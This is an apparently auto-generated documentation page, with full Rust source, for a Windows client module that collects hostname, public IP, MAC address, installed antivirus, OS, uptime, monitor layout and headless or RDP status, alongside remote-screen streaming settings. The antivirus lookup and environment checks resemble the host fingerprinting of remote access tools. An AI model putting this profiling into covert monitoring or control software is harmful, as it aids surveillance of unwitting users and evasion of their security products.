# sysinfo_collect

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/sysinfo_collect.rs` |
| **Lines** | 356 |
| **Cards** | T023-client-capabilities |
| **Role** | System info collection |
| **Unsafe blocks** | 5 |

## Types

### struct `SystemInfo` (line 7)

## Public API

### `collect` (line 34)
```rust
pub fn collect(
```

### `get_screen_dimensions` (line 258)
```rust
pub fn get_screen_dimensions() -> (u32, u32, u32, u32, u32)
```
Get screen dimensions using Win32 on Windows, or return defaults.

### `get_monitor_rect` (line 304)
```rust
pub fn get_monitor_rect(monitor_index: u32) -> (i32, i32, u32, u32)
```
Get all monitor geometries (left, top, width, height) for a given index.

## Internal Functions

- `get_hostname` (line 85)
- `get_public_ip` (line 111)
- `get_local_ip` (line 132)
- `get_mac_address` (line 144)
- `get_antivirus` (line 176)
- `get_os_name` (line 198)
- `get_uptime` (line 229)
- `detect_environment` — Detect if running in a VM/headless environment. (line 235)
- `count_monitor` (line 277)
- `enum_monitor` (unsafe) (line 314)

## Key Dependencies

- `use serde::{Deserialize, Serialize};`
- `use windows::Win32::System::SystemInformation::GetComputerNameExW;`
- `use windows::Win32::System::SystemInformation::ComputerNameDnsHostname;`
- `use windows::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXVIRTUALSCREEN, SM_REMOTESESSION};`
- `use windows::Win32::Foundation::RECT;`
- `use windows::Win32::Graphics::Gdi::{EnumDisplayMonitors, HDC, HMONITOR};`
- `use windows::Win32::UI::WindowsAndMessaging::{`
- `use windows::Win32::Foundation::{BOOL, LPARAM, RECT, TRUE};`
- `use windows::Win32::Graphics::Gdi::{`

## Full Source

```rust
// System information collection: PC name, IP, MAC, antivirus, OS, screen size, uptime
use serde::{Deserialize, Serialize};
// sysinfo_collect: system info gathering

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SystemInfo {
    pub pc_name: String,
    pub ip: String,
    pub mac: String,
    pub antivirus: String,
    pub country: String,
    pub os_name: String,
    pub client_type: String,
    pub uptime: u64,
    pub screen_width: u32,
    pub screen_height: u32,
    pub physical_width: u32,
    pub physical_height: u32,
    pub monitor_index: u32,
    pub monitors_count: u32,
    pub keyboard_enabled: bool,
    pub mouse_enabled: bool,
    pub screen_locked: bool,
    pub target_fps: u32,
    pub jpeg_quality: u32,
    pub actual_fps: f32,
    pub encoding_mode: String,
    #[serde(default)]
    pub environment: String,
}

impl SystemInfo {
    pub fn collect(
        monitor_index: u32,
        monitors_count: u32,
        screen_width: u32,
        screen_height: u32,
        physical_width: u32,
        physical_height: u32,
        keyboard_enabled: bool,
        mouse_enabled: bool,
        screen_locked: bool,
        target_fps: u32,
        jpeg_quality: u32,
        actual_fps: f32,
        encoding_mode: &str,
    ) -> Self {
        let pc_name = get_hostname();
        let ip = get_public_ip();
        let mac = get_mac_address();
        let antivirus = get_antivirus();
        let os_name = get_os_name();
        let uptime = get_uptime();

        let environment = detect_environment(screen_width, screen_height);

        SystemInfo {
            pc_name,
            ip,
            mac,
            antivirus,
            country: String::new(),
            os_name,
            client_type: "rust".to_string(),
            uptime,
            screen_width,
            screen_height,
            physical_width,
            physical_height,
            monitor_index,
            monitors_count,
            keyboard_enabled,
            mouse_enabled,
            screen_locked,
            target_fps,
            jpeg_quality,
            actual_fps,
            encoding_mode: encoding_mode.to_string(),
            environment,
        }
    }
}

fn get_hostname() -> String {
    #[cfg(windows)]
    {
        use windows::Win32::System::SystemInformation::GetComputerNameExW;
        use windows::Win32::System::SystemInformation::ComputerNameDnsHostname;
        let mut buf = vec![0u16; 256];
        let mut size = buf.len() as u32;
        unsafe {
            if GetComputerNameExW(ComputerNameDnsHostname, windows::core::PWSTR(buf.as_mut_ptr()), &mut size).is_ok() {
                return String::from_utf16_lossy(&buf[..size as usize]);
            }
        }
    }
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .or_else(|_| {
            std::process::Command::new("hostname")
                .output()
                .ok()
                .and_then(|o| String::from_utf8(o.stdout).ok())
                .map(|s| s.trim().to_string())
                .ok_or(std::env::VarError::NotPresent)
        })
        .unwrap_or_else(|_| "unknown".to_string())
}

fn get_public_ip() -> String {
    // Try ipify.org
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .build();

    if let Ok(client) = client {
        if let Ok(resp) = client.get("https://api.ipify.org").send() {
            if let Ok(text) = resp.text() {
                let trimmed = text.trim().to_string();
                if !trimmed.is_empty() {
                    return trimmed;
                }
            }
        }
    }

    // Fallback: local IP via socket trick
    get_local_ip()
}

fn get_local_ip() -> String {
    use std::net::UdpSocket;
    if let Ok(socket) = UdpSocket::bind("0.0.0.0:0") {
        if socket.connect("8.8.8.8:80").is_ok() {
            if let Ok(addr) = socket.local_addr() {
                return addr.ip().to_string();
            }
        }
    }
    "127.0.0.1".to_string()
}

fn get_mac_address() -> String {
    // Use uuid-style node ID from Rust's std library pattern:
    // Read from a network interface using the system network API.
    #[cfg(windows)]
    {
        // Use GetAdaptersInfo (simpler than GetAdaptersAddresses)
        // via a powershell command fallback
        if let Ok(output) = std::process::Command::new("powershell")
            .args([
                "-Command",
                "(Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -First 1 -ExpandProperty MacAddress)",
            ])
            .output()
        {
            if let Ok(text) = String::from_utf8(output.stdout) {
                let trimmed = text.trim().replace('-', ":");
                if trimmed.len() >= 17 {
                    return trimmed[..17].to_string();
                }
            }
        }
    }

    // Fallback: derive from hostname hash
    let hostname = get_hostname();
    let hash = md5::compute(hostname.as_bytes());
    format!(
        "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
        hash[0] & 0xFE, hash[1], hash[2], hash[3], hash[4], hash[5]
    )
}

fn get_antivirus() -> String {
    #[cfg(windows)]
    {
        use std::process::Command;
        if let Ok(output) = Command::new("powershell")
            .args([
                "-Command",
                "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object -ExpandProperty displayName",
            ])
            .output()
        {
            if let Ok(text) = String::from_utf8(output.stdout) {
                let trimmed = text.trim();
                if !trimmed.is_empty() {
                    return trimmed.lines().next().unwrap_or("").to_string();
                }
            }
        }
    }
    String::new()
}

fn get_os_name() -> String {
    #[cfg(windows)]
    {
        use std::process::Command;
        if let Ok(output) = Command::new("cmd")
            .args(["/C", "ver"])
            .output()
        {
            if let Ok(text) = String::from_utf8(output.stdout) {
                let trimmed = text.trim().to_string();
                if !trimmed.is_empty() {
                    return trimmed;
                }
            }
        }
        // Fallback: use environment
        let major = std::env::var("OS").unwrap_or_else(|_| "Windows".to_string());
        return major;
    }
    #[cfg(not(windows))]
    {
        let mut sys = sysinfo::System::new();
        sys.refresh_all();
        format!(
            "{} {}",
            sysinfo::System::name().unwrap_or_else(|| "Unknown".to_string()),
            sysinfo::System::os_version().unwrap_or_else(|| "".to_string())
        )
    }
}

fn get_uptime() -> u64 {
    sysinfo::System::uptime()
}

/// Detect if running in a VM/headless environment.
/// Returns "normal", "headless", or "rdp".
fn detect_environment(screen_width: u32, screen_height: u32) -> String {
    #[cfg(windows)]
    {
        use windows::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXVIRTUALSCREEN, SM_REMOTESESSION};

        unsafe {
            let vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
            if vw == 0 || (screen_width == 0 && screen_height == 0) {
                tracing::warn!("[sysinfo] Headless environment detected (SM_CXVIRTUALSCREEN={})", vw);
                return "headless".to_string();
            }
            // SM_REMOTESESSION (0x1000) is non-zero when running in RDP
            let remote = GetSystemMetrics(SM_REMOTESESSION);
            if remote != 0 {
                tracing::info!("[sysinfo] RDP session detected");
                return "rdp".to_string();
            }
        }
    }
    "normal".to_string()
}

/// Get screen dimensions using Win32 on Windows, or return defaults.
pub fn get_screen_dimensions() -> (u32, u32, u32, u32, u32) {
    // Returns (screen_w, screen_h, physical_w, physical_h, monitors_count)
    #[cfg(windows)]
    {
        use windows::Win32::Foundation::RECT;
        use windows::Win32::Graphics::Gdi::{EnumDisplayMonitors, HDC, HMONITOR};
        use windows::Win32::UI::WindowsAndMessaging::{
            GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN,
            SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN,
        };

        unsafe {
            let sw = GetSystemMetrics(SM_CXSCREEN) as u32;
            let sh = GetSystemMetrics(SM_CYSCREEN) as u32;
            let vw = GetSystemMetrics(SM_CXVIRTUALSCREEN) as u32;
            let vh = GetSystemMetrics(SM_CYVIRTUALSCREEN) as u32;

            // Count monitors using LPARAM to pass a mutable counter
            let mut mon_count: u32 = 0u32;
            extern "system" fn count_monitor(
                _: HMONITOR,
                _: HDC,
                _: *mut RECT,
                lparam: windows::Win32::Foundation::LPARAM,
            ) -> windows::Win32::Foundation::BOOL {
                unsafe {
                    if let Some(count) = (lparam.0 as *mut u32).as_mut() {
                        *count += 1;
                    }
                }
                windows::Win32::Foundation::TRUE
            }
            EnumDisplayMonitors(
                HDC(0), None, Some(count_monitor),
                windows::Win32::Foundation::LPARAM(&mut mon_count as *mut u32 as isize),
            );
            let mon_count = if mon_count == 0 { 1 } else { mon_count };

            return (sw, sh, vw.max(sw), vh.max(sh), mon_count);
        }
    }
    #[cfg(not(windows))]
    (1920, 1080, 1920, 1080, 1)
}

/// Get all monitor geometries (left, top, width, height) for a given index.
pub fn get_monitor_rect(monitor_index: u32) -> (i32, i32, u32, u32) {
    #[cfg(windows)]
    {
        use windows::Win32::Foundation::{BOOL, LPARAM, RECT, TRUE};
        use windows::Win32::Graphics::Gdi::{
            EnumDisplayMonitors, GetMonitorInfoW, HDC, HMONITOR, MONITORINFO,
        };

        let mut monitors: Vec<(i32, i32, u32, u32)> = Vec::new();

        unsafe extern "system" fn enum_monitor(
            hmon: HMONITOR,
            _: HDC,
            _: *mut RECT,
            lparam: LPARAM,
        ) -> BOOL {
            let monitors = &mut *(lparam.0 as *mut Vec<(i32, i32, u32, u32)>);
            let mut info = MONITORINFO {
                cbSize: std::mem::size_of::<MONITORINFO>() as u32,
                ..Default::default()
            };
            if GetMonitorInfoW(hmon, &mut info).as_bool() {
                let r = info.rcMonitor;
                monitors.push((
                    r.left,
                    r.top,
                    (r.right - r.left) as u32,
                    (r.bottom - r.top) as u32,
                ));
            }
            TRUE
        }

        unsafe {
            EnumDisplayMonitors(
                HDC(0),
                None,
                Some(enum_monitor),
                LPARAM(&mut monitors as *mut Vec<(i32, i32, u32, u32)> as isize),
            );
        }

        if let Some(&rect) = monitors.get(monitor_index as usize) {
            return rect;
        }
        if let Some(&rect) = monitors.first() {
            return rect;
        }
        (0, 0, 1920, 1080)
    }
    #[cfg(not(windows))]
    (0, 0, 1920, 1080)
}

```